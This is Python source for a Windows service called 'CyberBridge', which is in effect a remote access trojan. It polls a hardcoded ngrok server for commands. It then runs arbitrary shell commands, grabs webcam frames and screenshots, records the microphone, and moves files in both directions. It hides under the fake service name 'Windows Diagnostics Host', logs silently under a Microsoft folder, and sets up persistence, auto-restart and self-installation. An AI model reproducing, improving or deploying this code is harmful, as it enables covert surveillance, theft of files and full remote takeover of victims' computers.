"""
CyberBridge - Windows Service Wrapper (HTTP transport)
Registers and runs the CyberBridge client as a proper Windows Service.
Uses HTTP polling instead of RPyC + UDP.

Usage (run as Administrator):
  python service.py install    ← installs the service
  python service.py start      ← starts it
  python service.py stop       ← stops it
  python service.py remove     ← uninstalls it
  python service.py debug      ← run interactively for testing
"""

import sys
import os
import time
import logging
import threading
import socket
import json
import uuid
import base64
import io
import wave
import subprocess
import platform

# ─── Path setup ───────────────────────────────────────────────────────────────
if getattr(sys, 'frozen', False):
    _ROOT = sys._MEIPASS
    _BASE = os.path.join(sys._MEIPASS, 'client')
else:
    _BASE = os.path.dirname(os.path.abspath(__file__))
    _ROOT = os.path.join(_BASE, '..')

sys.path.insert(0, os.path.abspath(_ROOT))
sys.path.insert(0, os.path.abspath(_BASE))

# ─── Logging (silent — file only) ────────────────────────────────────────────
LOG_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                       "Microsoft", "Logs")
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    filename=os.path.join(LOG_DIR, "cbsvc.log"),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("cyberbridge.service")

# ─── pywin32 service imports ──────────────────────────────────────────────────
import win32serviceutil
import win32service
import win32event
import servicemanager

# ─── Configuration ────────────────────────────────────────────────────────────
try:
    from config import SERVER_URL, POLL_INTERVAL
except ImportError:
    SERVER_URL    = "https://1b19-190-107-209-205.ngrok-free.app"
    POLL_INTERVAL = 3

# ─── Persistent client ID ─────────────────────────────────────────────────────
_ID_FILE = os.path.join(LOG_DIR, "cbid.dat")

def _load_or_create_id() -> str:
    try:
        if os.path.exists(_ID_FILE):
            with open(_ID_FILE) as f:
                return f.read().strip()
    except Exception:
        pass
    cid = str(uuid.uuid4())
    try:
        with open(_ID_FILE, "w") as f:
            f.write(cid)
    except Exception:
        pass
    return cid

_CLIENT_ID = _load_or_create_id()

# ─── Persistent working directory ────────────────────────────────────────────
_CWD = os.path.expanduser("~")   # starts at home directory

# ─── Optional imports ────────────────────────────────────────────────────────
try:
    import cv2
    _CV2 = True
except ImportError:
    _CV2 = False

try:
    import pyaudio
    _AUDIO_AVAIL = True
except ImportError:
    _AUDIO_AVAIL = False

try:
    from PIL import ImageGrab
    _SS = True
except ImportError:
    _SS = False

try:
    import psutil
    _PSUTIL = True
except ImportError:
    _PSUTIL = False

try:
    import requests as _req
    _REQUESTS = True
except ImportError:
    _REQUESTS = False

# ─── Shared audio state ───────────────────────────────────────────────────────
_AUDIO = {"active": False, "buffer": b"", "error": None,
          "device": None, "lock": threading.Lock()}
_AUDIO_REC = {
    "active": False,
    "frames": [],
    "error":  None,
    "lock":   threading.Lock(),
    "done":   threading.Event(),
}

# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def _http_post(path: str, payload: dict) -> dict:
    url = SERVER_URL.rstrip("/") + path
    if _REQUESTS:
        try:
            r = _req.post(url, json=payload, timeout=600)
            return r.json()
        except Exception as e:
            logger.warning("POST %s failed: %s", path, e)
            return {}
    else:
        import urllib.request
        try:
            data = json.dumps(payload).encode()
            req  = urllib.request.Request(url, data=data,
                                          headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=600) as resp:
                return json.loads(resp.read())
        except Exception as e:
            logger.warning("POST %s failed: %s", path, e)
            return {}


def _http_get(path: str) -> dict:
    url = SERVER_URL.rstrip("/") + path
    if _REQUESTS:
        try:
            r = _req.get(url, timeout=600)
            return r.json()
        except Exception as e:
            logger.warning("GET %s failed: %s", path, e)
            return {}
    else:
        import urllib.request
        try:
            with urllib.request.urlopen(url, timeout=600) as resp:
                return json.loads(resp.read())
        except Exception as e:
            logger.warning("GET %s failed: %s", path, e)
            return {}

# ─── Registration ─────────────────────────────────────────────────────────────

def _register() -> bool:
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
    except Exception:
        ip = "127.0.0.1"
    resp = _http_post("/register", {
        "client_id": _CLIENT_ID,
        "hostname":  hostname,
        "ip":        ip,
        "port":      0,
    })
    return resp.get("status") == "ok"

# ─── Command handlers ─────────────────────────────────────────────────────────

def _dispatch(cmd: dict) -> dict:
    t   = cmd.get("type", "")
    p   = cmd.get("payload", {})
    try:
        if t == "ping":
            return {"value": "pong"}
        elif t == "get_system_info":
            info = {
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "release":  platform.release(),
                "machine":  platform.machine(),
                "processor":platform.processor(),
                "python":   platform.python_version(),
                "ip":       "127.0.0.1",
            }
            try: info["ip"] = socket.gethostbyname(socket.gethostname())
            except Exception: pass
            if _PSUTIL:
                try:
                    info.update({
                        "cpu_count":  psutil.cpu_count(),
                        "cpu_pct":    psutil.cpu_percent(interval=0.5),
                        "ram_total":  psutil.virtual_memory().total,
                        "ram_used":   psutil.virtual_memory().used,
                        "ram_pct":    psutil.virtual_memory().percent,
                        "disk_total": psutil.disk_usage("C:\\").total,
                        "disk_used":  psutil.disk_usage("C:\\").used,
                        "uptime":     time.time() - psutil.boot_time(),
                    })
                except Exception: pass
            return {"value": info}
        elif t == "execute_command":
            global _CWD
            cmd_str = p.get("command", "").strip()

            # ── Handle cd specially (subprocess cd has no effect) ──────────────
            stripped = cmd_str.strip()
            if stripped.lower() == "cd" or stripped.lower().startswith("cd ") \
                    or stripped.lower().startswith("cd\t"):
                # Extract the target path
                parts  = stripped.split(None, 1)
                target = parts[1].strip().strip('"').strip("'") if len(parts) > 1 else ""
                if not target or target == "~":
                    new_dir = os.path.expanduser("~")
                elif target == "-":
                    new_dir = os.path.expanduser("~")  # fallback
                elif not os.path.isabs(target):
                    new_dir = os.path.normpath(os.path.join(_CWD, target))
                else:
                    new_dir = os.path.normpath(target)

                if os.path.isdir(new_dir):
                    _CWD = new_dir
                    return {"value": {"stdout": "", "stderr": "",
                                      "returncode": 0, "command": cmd_str,
                                      "cwd": _CWD}}
                else:
                    return {"value": {"stdout": "",
                                      "stderr": f"El sistema no puede encontrar la ruta especificada: '{new_dir}'",
                                      "returncode": 1, "command": cmd_str,
                                      "cwd": _CWD}}

            # ── Regular command — run in current _CWD ─────────────────────────
            try:
                res = subprocess.run(cmd_str, shell=True, capture_output=True,
                                     text=True, timeout=30, cwd=_CWD)
                return {"value": {"stdout": res.stdout, "stderr": res.stderr,
                                  "returncode": res.returncode, "command": cmd_str,
                                  "cwd": _CWD}}
            except subprocess.TimeoutExpired:
                return {"value": {"stdout": "", "stderr": "Timed out (30s)",
                                  "returncode": -1, "command": cmd_str,
                                  "cwd": _CWD}}
        elif t == "get_camera_frame":
            if not _CV2: return {"value": ""}
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if not ret: return {"value": ""}
                _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                return {"value": base64.b64encode(bytes(buf)).decode()}
            except Exception: return {"value": ""}
        elif t == "screenshot":
            if not _SS: return {"value": ""}
            try:
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=60)
                return {"value": base64.b64encode(buf.getvalue()).decode()}
            except Exception: return {"value": ""}
        elif t == "screen_frame":
            if not _SS: return {"value": ""}
            try:
                quality = p.get("quality", 45)
                scale   = p.get("scale", 0.6)
                img = ImageGrab.grab()
                img = img.resize((int(img.width*scale), int(img.height*scale)))
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=quality, optimize=True)
                return {"value": base64.b64encode(buf.getvalue()).decode()}
            except Exception: return {"value": ""}
        elif t == "start_audio_stream":
            if not _AUDIO_AVAIL: return {"value": False}
            if _AUDIO["active"]: return {"value": True}
            _AUDIO["active"] = True
            _AUDIO["buffer"] = b""
            def _rec():
                pa = stream = None
                try:
                    pa = pyaudio.PyAudio()
                    stream = pa.open(format=pyaudio.paInt16, channels=1,
                                     rate=16000, input=True, frames_per_buffer=512)
                    while _AUDIO["active"]:
                        chunk = stream.read(512, exception_on_overflow=False)
                        with _AUDIO["lock"]:
                            _AUDIO["buffer"] += chunk
                            if len(_AUDIO["buffer"]) > 16000:
                                _AUDIO["buffer"] = _AUDIO["buffer"][-16000:]
                except Exception as e:
                    _AUDIO["error"] = str(e)
                    _AUDIO["active"] = False
                finally:
                    for obj, m in [(stream,"stop_stream"),(stream,"close"),(pa,"terminate")]:
                        if obj:
                            try: getattr(obj,m)()
                            except Exception: pass
            threading.Thread(target=_rec, daemon=True).start()
            return {"value": True}
        elif t == "stop_audio_stream":
            _AUDIO["active"] = False
            return {"value": True}
        elif t == "get_audio_chunk":
            with _AUDIO["lock"]:
                chunk = _AUDIO["buffer"]
                _AUDIO["buffer"] = b""
            return {"value": base64.b64encode(chunk).decode() if chunk else ""}
        elif t == "start_audio_record":
            if not _AUDIO_AVAIL: return {"value": False}
            if _AUDIO_REC["active"]: return {"value": True}
            _AUDIO_REC["active"] = True
            _AUDIO_REC["frames"] = []
            _AUDIO_REC["error"] = None
            _AUDIO_REC["done"].clear()
            def _rec_audio():
                pa = stream = None
                try:
                    pa = pyaudio.PyAudio()
                    stream = pa.open(format=pyaudio.paInt16, channels=1,
                                     rate=16000, input=True, frames_per_buffer=512)
                    while _AUDIO_REC["active"]:
                        chunk = stream.read(512, exception_on_overflow=False)
                        with _AUDIO_REC["lock"]:
                            _AUDIO_REC["frames"].append(chunk)
                except Exception as e:
                    _AUDIO_REC["error"] = str(e)
                    _AUDIO_REC["active"] = False
                finally:
                    for obj, m in [(stream,"stop_stream"),(stream,"close"),(pa,"terminate")]:
                        if obj:
                            try: getattr(obj,m)()
                            except Exception: pass
                    _AUDIO_REC["done"].set()
            threading.Thread(target=_rec_audio, daemon=True).start()
            return {"value": True}
        elif t == "stop_audio_record":
            if not _AUDIO_REC["active"] and not _AUDIO_REC["frames"]:
                return {"value": ""}
            _AUDIO_REC["active"] = False
            _AUDIO_REC["done"].wait(timeout=6)
            with _AUDIO_REC["lock"]:
                frames = list(_AUDIO_REC["frames"])
                _AUDIO_REC["frames"] = []
            if not frames:
                return {"value": ""}
            buf = io.BytesIO()
            wf = wave.open(buf, "wb")
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(16000)
            wf.writeframes(b"".join(frames))
            wf.close()
            return {"value": base64.b64encode(buf.getvalue()).decode()}
        elif t == "list_directory":
            path = p.get("path", ".")
            try:
                entries = []
                for e in os.scandir(path):
                    try:
                        entries.append({"name": e.name, "is_dir": e.is_dir(),
                                        "size": e.stat().st_size if not e.is_dir() else 0,
                                        "modified": e.stat().st_mtime})
                    except PermissionError: continue
                return {"value": entries}
            except Exception as e:
                return {"value": [{"error": str(e)}]}
        elif t == "upload_file":
            path = p.get("path", "")
            data_b64 = p.get("data", "")
            try:
                data = base64.b64decode(data_b64)
                d = os.path.dirname(path)
                if d and not os.path.exists(d): os.makedirs(d, exist_ok=True)
                with open(path, "wb") as f: f.write(data)
                return {"value": True}
            except Exception as e:
                logger.error(f"Upload failed: {e}")
                return {"value": False}
        elif t == "download_file":
            path = p.get("path", "")
            try:
                if not os.path.exists(path): return {"value": ""}
                with open(path, "rb") as f: data = f.read()
                return {"value": base64.b64encode(data).decode()}
            except Exception as e:
                logger.error(f"Download failed: {e}")
                return {"value": ""}
        else:
            return {"error": f"Unknown command: {t}"}
    except Exception as e:
        return {"error": str(e)}


# ─── Poll loop ────────────────────────────────────────────────────────────────

def _poll_loop(running_flag):
    while running_flag["running"]:
        try:
            resp = _http_get(f"/commands/{_CLIENT_ID}")
            for cmd in resp.get("commands", []):
                result = _dispatch(cmd)
                _http_post(f"/result/{_CLIENT_ID}", {"id": cmd["id"], "result": result})
        except Exception as e:
            logger.warning("Poll error: %s", e)
        time.sleep(POLL_INTERVAL)


def _register_loop(running_flag):
    while running_flag["running"]:
        try:
            _register()
        except Exception as e:
            logger.warning("Register error: %s", e)
        time.sleep(30)


def _configure_service_recovery():
    try:
        subprocess.run(
            ["sc", "failure", "CyberBridgeSvc", "reset=", "0",
             "actions=", "restart/5000/restart/5000/restart/5000"],
            capture_output=True, text=True, timeout=5
        )
        subprocess.run(
            ["sc", "failureflag", "CyberBridgeSvc", "1"],
            capture_output=True, text=True, timeout=5
        )
    except Exception as e:
        logger.warning("Service recovery setup failed: %s", e)


def _setup_persistence():
    try:
        from core.persistence import setup_persistence
        setup_persistence()
        logger.info("Persistence setup complete.")
    except Exception as e:
        logger.warning("Persistence setup error: %s", e)


def _start_watchdog_if_possible() -> bool:
    try:
        from core.watchdog import run_watchdog_if_requested, start_watchdog
        if run_watchdog_if_requested():
            return False
        start_watchdog()
    except Exception as e:
        logger.warning("Watchdog error: %s", e)
    return True


# ─── Service Definition ───────────────────────────────────────────────────────

class CyberBridgeClientService(win32serviceutil.ServiceFramework):

    _svc_name_         = "CyberBridgeSvc"
    _svc_display_name_ = "Windows Diagnostics Host"
    _svc_description_  = (
        "Collects and reports system diagnostics for Windows maintenance."
    )
    _svc_start_type_   = win32service.SERVICE_AUTO_START
    _svc_error_control_= win32service.SERVICE_ERROR_NORMAL

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self._stop_event  = win32event.CreateEvent(None, 0, 0, None)
        self._flag        = {"running": False}

    def SvcStop(self):
        logger.info("Service stop requested.")
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self._flag["running"] = False
        win32event.SetEvent(self._stop_event)

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, ""),
        )
        logger.info("CyberBridge service starting (HTTP mode).")
        _configure_service_recovery()
        _setup_persistence()
        _start_watchdog_if_possible()
        self._flag["running"] = True

        # Wait for initial registration
        deadline = time.time() + 60
        while time.time() < deadline:
            if _register():
                logger.info("Registered with server.")
                break
            time.sleep(5)

        # Start background threads
        threading.Thread(target=_register_loop, args=(self._flag,), daemon=True).start()
        threading.Thread(target=_poll_loop,     args=(self._flag,), daemon=True).start()

        logger.info("CyberBridge service fully operational.")
        win32event.WaitForSingleObject(self._stop_event, win32event.INFINITE)
        logger.info("CyberBridge service stopped.")


# ─── Standalone runner ────────────────────────────────────────────────────────

def _run_standalone():
    logger.info("Running in standalone HTTP mode.")
    _setup_persistence()
    if not _start_watchdog_if_possible():
        return
    flag = {"running": True}

    # Register first
    deadline = time.time() + 60
    while time.time() < deadline:
        if _register():
            logger.info("Registered with server.")
            break
        logger.info("Waiting to register…")
        time.sleep(5)

    threading.Thread(target=_register_loop, args=(flag,), daemon=True).start()
    threading.Thread(target=_poll_loop,     args=(flag,), daemon=True).start()
    logger.info("Standalone polling started → %s", SERVER_URL)

    while flag["running"]:
        time.sleep(30)


# ─── Entry point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) == 1:
        # Check watchdog first (only if no args, assuming normal launch)
        if not _start_watchdog_if_possible():
            sys.exit(0)

        try:
            servicemanager.Initialize()
            servicemanager.PrepareToHostSingle(CyberBridgeClientService)
            servicemanager.StartServiceCtrlDispatcher()
        except Exception as e:
            err = getattr(e, 'winerror', None)
            if err == 1063:
                logger.info("Direct launch — trying service install.")
                installed = False
                try:
                    win32serviceutil.InstallService(
                        None,
                        CyberBridgeClientService._svc_name_,
                        CyberBridgeClientService._svc_display_name_,
                        startType=win32service.SERVICE_AUTO_START,
                        exeName=sys.executable,
                    )
                    win32serviceutil.StartService(CyberBridgeClientService._svc_name_)
                    installed = True
                    logger.info("Service installed and started OK.")
                except Exception as ie:
                    logger.warning("Service install failed (%s) — standalone mode.", ie)

                if not installed:
                    _run_standalone()
            else:
                logger.warning("SCM error %s — falling back to standalone.", e)
                _run_standalone()
    else:
        win32serviceutil.HandleCommandLine(CyberBridgeClientService)
